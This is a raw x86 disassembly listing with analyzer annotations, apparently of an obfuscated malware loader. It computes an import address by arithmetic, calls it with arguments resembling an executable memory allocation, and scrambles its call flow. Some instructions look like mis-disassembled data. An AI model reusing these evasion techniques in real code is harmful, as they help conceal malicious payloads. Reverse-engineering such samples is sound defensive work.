0x00401030:	movl	%edi, %edi	; from: 0x004013c9(MAY)
0x00401032:	movl	%esp, %ebp
0x00401034:	subl	$0x50, %esp
0x00401037:	movl	$0x40, %edi
0x0040103c:	pushl	%edi
0x0040103d:	movl	$0x1000, %esi
0x00401042:	pushl	%esi
0x00401043:	pushl	$0x6c0
0x00401048:	movl	$0x0, %edx
0x0040104d:	pushl	%edx
0x0040104e:	pushl	$0xffffffff
0x00401050:	leal	0x56ba43ad, %eax
0x00401056:	subl	$0x567a2391, %eax
0x0040105b:	pushl	(%eax)
0x0040105d:	pushl	$0x402004
0x00401062:	popl	%eax
0x00401063:	popl	(%eax)
0x00401065:	decl	(%eax)
0x00401067:	movl	WaitForSingleObject@kernel32.dll, %eax
0x0040106c:	call	%eax	; targets: unresolved
0x004010c4:	jb	0x004010cc	; targets: 0x004010ca(MAY), 0x004010cc(MAY)	; from: 0x00401171(MAY)
0x004010ca:	addb	%al, (%eax)	; from: 0x004010c4(MAY)
0x004010cc:	movl	%edi, %edi	; from: 0x004010c4(MAY)
0x004010ce:	pusha	
0x004010cf:	pushl	%ebp
0x004010d0:	movl	%esp, %ebp
0x004010d2:	subl	$0x40, %esp
0x004010d5:	pushl	%ebx
0x004010d6:	pushl	%esi
0x004010d7:	pushl	(%ebx)
0x004010d9:	pushl	(%ebx)
0x004010db:	call	0x0040143c	; targets: 0x0040143c(MAY)

start:
0x0040113c:	andb	$0x0, %al
0x0040113e:	movzbl	%al, %eax
0x00401141:	pushl	%eax
0x00401142:	pushl	$0x402096
0x00401147:	popl	%edi
0x00401148:	adcl	$0x403002, (%esp)
0x0040114f:	pushw	(%edi)
0x00401152:	popw	%ax
0x00401154:	roll	$0x10, %eax
0x00401157:	pushl	0x3a(%eax)
0x0040115a:	popl	%edx
0x0040115b:	shrl	$0x10, %edx
0x0040115e:	addl	$0x1d, %edx
0x00401161:	addl	%eax, %edx
0x00401163:	cmpb	$0x3a, (%edx)
0x00401166:	jb	0x00401176	; targets: 0x00401176(MAY), 0x00401168(MAY)
0x00401168:	xorl	%eax, %eax	; from: 0x00401166(MAY)
0x0040116a:	cmpb	$0x55, (%eax,%edx)
0x0040116e:	ja	0x00401176	; targets: 0x00401176(MAY), 0x00401170(MAY)
0x00401170:	popl	%ebx	; from: 0x0040116e(MAY)
0x00401171:	jmp	0x004010c4	; targets: 0x004010c4(MAY)
0x00401176:	popl	%ecx	; from: 0x0040116e(MAY), 0x00401166(MAY)
0x00401177:	addb	%al, (%eax)
0x00401179:	addb	%dh, 0x55ff8b43(%edi)
0x0040117c:	movl	%edi, %edi	; from: 0x0040120b(MAY)
0x0040117e:	pushl	%ebp
0x0040117f:	movl	%esp, %ebp
0x00401181:	subl	$0x34, %esp
0x00401184:	pushl	%ebx
0x00401185:	pushl	%edi
0x00401186:	pushl	%ecx
0x00401187:	call	0x004013dc	; targets: 0x004013dc(MAY)
0x004011fc:	movl	%edi, %edi	; from: 0x00401449(MAY)
0x004011fe:	pushl	%ebp
0x004011ff:	movl	%esp, %ebp
0x00401201:	subl	$0x48, %esp
0x00401204:	pushl	%ebx
0x00401205:	pushl	(%ebx)
0x00401207:	pushl	%esi
0x00401208:	pushl	(%ebx)
0x0040120a:	pushl	%eax
0x0040120b:	call	0x0040117c	; targets: 0x0040117c(MAY)
0x00401250:	movl	%edi, %edi	; from: 0x004012c4(MAY)
0x00401252:	pushl	%ebp
0x00401253:	movl	%esp, %ebp
0x00401255:	subl	$0x1c, %esp
0x00401258:	pushl	%ebx
0x00401259:	pushl	%eax
0x0040125a:	pushl	(%ebx)
0x0040125c:	pushl	(%ebx)
0x0040125e:	call	0x004013b8	; targets: 0x004013b8(MAY)
0x004012b4:	movl	%edi, %edi	; from: 0x004013e9(MAY)
0x004012b6:	pushl	%ebp
0x004012b7:	movl	%esp, %ebp
0x004012b9:	subl	$0x60, %esp
0x004012bc:	pushl	%ebx
0x004012bd:	pushl	%ecx
0x004012be:	pushl	(%ebx)
0x004012c0:	pushl	(%ebx)
0x004012c2:	pushl	(%ebx)
0x004012c4:	call	0x00401250	; targets: 0x00401250(MAY)
0x004013b8:	movl	%edi, %edi	; from: 0x0040125e(MAY)
0x004013ba:	pushl	%ebp
0x004013bb:	movl	%esp, %ebp
0x004013bd:	subl	$0x28, %esp
0x004013c0:	pushl	%ebx
0x004013c1:	pushl	(%ebx)
0x004013c3:	pushl	(%ebx)
0x004013c5:	pushl	(%ebx)
0x004013c7:	pushl	(%ebx)
0x004013c9:	call	0x00401030	; targets: 0x00401030(MAY)
0x004013dc:	movl	%edi, %edi	; from: 0x00401187(MAY)
0x004013de:	pushl	%ebp
0x004013df:	movl	%esp, %ebp
0x004013e1:	subl	$0x28, %esp
0x004013e4:	pushl	%ebx
0x004013e5:	pushl	(%ebx)
0x004013e7:	pushl	(%ebx)
0x004013e9:	call	0x004012b4	; targets: 0x004012b4(MAY)
0x0040143c:	movl	%edi, %edi	; from: 0x004010db(MAY)
0x0040143e:	pushl	%ebp
0x0040143f:	movl	%esp, %ebp
0x00401441:	subl	$0x20, %esp
0x00401444:	pushl	%ebx
0x00401445:	pushl	%edi
0x00401446:	pushl	%edx
0x00401447:	pushl	(%ebx)
0x00401449:	call	0x004011fc	; targets: 0x004011fc(MAY)